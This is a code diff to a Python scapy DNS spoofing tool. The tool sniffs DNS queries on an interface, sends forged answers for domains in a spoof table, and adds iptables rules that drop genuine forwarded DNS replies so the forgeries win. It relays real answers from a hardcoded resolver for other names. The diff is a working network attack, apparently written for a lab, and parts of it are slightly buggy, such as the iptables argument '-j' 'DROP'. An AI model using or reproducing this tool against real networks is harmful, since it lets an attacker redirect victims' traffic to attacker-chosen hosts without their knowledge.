@@ -3,15 +3,12 @@
 import threading
 import time
 import click
-from scapy.all import DNS, UDP, IP, DNSRR, send, sniff
+from scapy.all import DNS, UDP, IP, DNSRR, send, sniff, DNSQR, sr1
 from .domains import get_domains
-from .general import get_interface
+from .general import get_interface, get_my_ip
+import subprocess
 
-# Port used for sniffing dns queries
-port = "udp port 53"
 
-# Global flag to indicate when to stop sniffing
-stop_event = threading.Event()
 
 def spoof_dns_all(interface):
     '''
@@ -41,25 +38,33 @@ def start_attack(table, interface):
     '''
 
     interface = get_interface(interface)
+    print('setting ip tables')
+    subprocess.run(['iptables', '-A', 'FORWARD', '-p', 'udp', '--sport', '53', '-j' 'DROP'])
 
     # Start subthread running attack
-    attack_thread = threading.Thread(target=attack, args=(table,interface,))
+    stop_event = threading.Event()
+    attack_thread = threading.Thread(target=attack, args=(table,interface,stop_event))
     attack_thread.start()
 
     try:
         # Wait for keyboard interrupt
         while True:
-            time.sleep(0.1)
+            time.sleep(2)
     except KeyboardInterrupt:
         # Set stop_event when keyboard interrupt occurs
+        print('resetting ip tables')
+        subprocess.run(['iptables', '-D', 'FORWARD', '-p', 'udp', '--sport', '53', '-j' 'DROP'])
         stop_event.set()
         attack_thread.join()
 
 
-def attack(table, interface):
+def attack(table, interface, stop_event):
     '''
     Sniffs network for DNS packets
     '''
+    
+    # Port used for sniffing dns queries
+    port = "udp port 53"
 
     sniff(filter=port, iface=interface, prn=lambda pkt: analyze_packet(pkt, table, interface), stop_filter=stop_event.is_set())
 
@@ -81,7 +86,12 @@ def analyze_packet(packet, table, interface):
 
     if query_name in table:
         click.echo(f'Found a query to spoof: {query_name}')
+        
         spoof_packet(packet, query_name, table[query_name], interface)
+        return
+    elif packet[IP].src != get_my_ip(interface):
+        click.echo(f'Sent the normal dns response')
+        forward_dns(packet, query_name, interface)
         return
 
 
@@ -115,6 +125,38 @@ def spoof_packet(packet, spoofed_domain, spoofed_ip, interface):
     click.echo("Sending spoofed packet")
 
     send(spoofed_reply, iface=interface)
+
+def forward_dns(packet, requested_domain, interface):
+    '''
+    Forwards the normal dns response
+    '''
+    real_response = sr1(IP(dst='10.0.86.4')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=requested_domain)), verbose=0)
+    real_ip = real_response[DNSRR].rdata
+    # Make DNS template message
+    actual_reply = IP() / UDP() / DNS()
+
+    # Swap source/dest for UDP and IP layers
+    actual_reply[IP].src = packet[IP].dst
+    actual_reply[IP].dst = packet[IP].src
+    actual_reply[UDP].sport = packet[UDP].dport
+    actual_reply[UDP].dport = packet[UDP].sport
+
+    # Copy the ID
+    actual_reply[DNS].id = packet[DNS].id
+
+    # Set query to response
+    actual_reply[DNS].qr = 1
+    actual_reply[DNS].aa = 0
+
+    # Pass the DNS Question Record to the resposne
+    actual_reply[DNS].qd = packet[DNS].qd
+
+    # Set spoofed answer
+    actual_reply[DNS].an = DNSRR(rrname=requested_domain, rdata=real_ip, type="A", rclass="IN")
+
+    click.echo("Sending spoofed packet")
+
+    send(actual_reply, iface=interface)
 
 
 def get_packet_query_name(dns_packet):
